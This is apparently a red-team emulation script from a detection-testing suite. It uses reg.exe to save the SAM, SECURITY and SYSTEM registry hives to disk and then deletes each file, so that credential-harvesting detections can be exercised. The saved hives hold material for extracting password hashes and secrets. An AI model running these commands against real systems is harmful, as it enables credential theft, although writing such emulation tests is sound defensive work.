# Name: Export Registry Hives
# rta: registry_hive_export.py
# ATT&CK: TBD
# Description: Exports the SAM, SECURITY and SYSTEM hives - useful in credential harvesting and discovery attacks.

import os
import common

REG = "reg.exe"


def main():
    for hive in ["sam", "security", "system"]:
        filename = os.path.abspath("%s.reg" % hive)
        common.log("Exporting %s hive to %s" % (hive, filename))
        common.execute([REG, "save", "hkey_local_machine\\%s" % hive, filename])
        common.remove_file(filename)

        common.execute([REG, "save", "hklm\\%s" % hive, filename])
        common.remove_file(filename)


if __name__ == "__main__":
    exit(main())
